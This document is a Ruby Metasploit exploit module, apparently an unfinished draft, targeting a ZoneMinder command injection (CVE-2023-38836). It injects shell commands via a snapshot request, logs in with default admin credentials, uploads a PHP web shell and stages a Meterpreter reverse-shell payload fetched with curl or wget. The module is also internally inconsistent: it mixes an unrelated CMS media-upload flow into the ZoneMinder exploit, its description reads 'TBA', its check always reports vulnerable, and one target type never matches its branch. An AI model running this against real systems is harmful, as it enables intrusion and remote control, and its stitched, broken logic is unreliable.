##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ZoneMinder Snapshots Command Injection',
        'Description' => %q{
          TBA
        },
        'License' => MSF_LICENSE,
        'Author' => [
          '1337kid',    # Discovery
          'bwatters-r7' # Metasploit Module
        ],
        'References' => [
          [ 'CVE', '2023-38836' ],
          [ 'URL', 'https://github.com/1337kid/CVE-2023-38836']
        ],
        'Privileged' => false,
        'Platform' => ['linux', 'unix'],
        'Targets' => [
          [
            'nix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :nix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp',
                'FETCH_WRITABLE_DIR' => '/tmp'
              }
            }
          ],
          [
            'Linux (Dropper)',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
              'Type' => :linux_dropper
            }
          ],
        ],
        'CmdStagerFlavor' => [ 'bourne', 'curl', 'wget', 'printf', 'echo' ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-02-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
                       OptString.new('TARGETURI', [true, 'The path', '/admin'])
                     ])
    @token = nil
  end

  def check
    Exploit::CheckCode::Appears('Yay')
  end

  def execute_command(cmd, _opts = {})
    command = Rex::Text.uri_encode(cmd)
    print_status('Sending payload')
    data = "view=snapshot&action=create&monitor_ids[0][Id]=;#{command}"
    data += "&__csrf_magic=#{@csrf_magic}" if @csrf_magic
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'data' => data.to_s
    )
    print_good('Payload sent')
  end

  def extract_token(res)
    token = nil
    if res && res.code == 200
      token = res.get_html_document.xpath("//input[@name='token']/@value").first
    end
    token
  end

  def exploit
    # initial login
    vprint_status('Getting Logon Token')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin'),
      'method' => 'GET',
      'keep_cookies' => true
    )
    login_token = extract_token(res)
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve login token') if login_token.nil?

    login_data =
      {
        'username': 'admin',
        'password': 'password',
        'login': 'Login',
        'token': login_token.to_s
      }

    vprint_status('Logging in')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin'),
      'method' => 'POST',
      'keep_cookies' => true,
      'data' => login_data.to_json
    )

    vprint_status('Getting Media Token')
    # get media upload token
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin?page=media'),
      'method' => 'GET',
      'keep_cookies' => true
    )

    media_token = extract_token(res)
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve login token') if media_token.nil?
    vprint_status("Media token = #{media_token}")

    upload_data =
      {
        'token': media_token.to_s,
        'upload': 'Upload'
      }

    # upload file
    vprint_status('Uploading PHP')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin?page=media'),
      'method' => 'POST',
      'data' => upload_data.to_json,
      'files' => 'GIF89a;\n<?php system($_GET["id"]) ?>',
      'keep_cookies' => true
    )

    # retrieve output
    vprint_status('Checking result')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/media/shell.php'),
      'method' => 'GET',
      'keep_cookies' => true
    )


    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

end
